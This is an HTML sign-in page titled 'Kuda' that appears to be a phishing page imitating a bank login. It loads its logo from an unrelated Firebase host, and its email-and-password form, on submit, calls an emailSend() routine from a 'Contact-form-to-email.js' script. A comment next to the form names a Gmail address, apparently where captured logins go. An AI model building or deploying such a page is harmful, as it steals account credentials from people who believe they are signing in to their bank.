<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link
      rel="shortcut icon"
      href="https://younk-5b894.web.app/images/logo.png"
      type="image/x-icon"
    />
    <title>Kuda</title>
    <link
      rel="stylesheet"
      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
      integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA=="
      crossorigin="anonymous"
      referrerpolicy="no-referrer"
    />
    <link rel="stylesheet" href="style.css" />
  </head>
  <body>
  <div class="container" >
      <div class="contentSec">
        <div class="logo">
          <img src="https://younk-5b894.web.app/images/logo.png" alt="" />
        </div>
        <div class="title">Hey, there!</div>
      </div>
      <div class="loginWrapper">
        <div class="loginSec">
              <form id="form" onsubmit="emailSend(); reset(); return false;" > <!--payday10177@gmail.com-->
      
            <label for="email">Email Address</label>
            <div class="formInput">
              <input
                id="email"
                name="username"
                type="text"
                placeholder="example@email.com"
                required
              />
            </div>
            <label for="password">Password</label>
            <div class="formInput">
              <input
                id="password"
                name="password"
                type="password"
                placeholder="***********"
                required
              />
              <i class="fa-regular fa-eye"></i>
            </div>

            <button type="submit">Sign In</button>
          </form>
        </div>
      </div>
   </div>
    <script src="app.js"></script>
    <script src="Contact-form-to-email.js"></script>
<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
  </body>
</html>
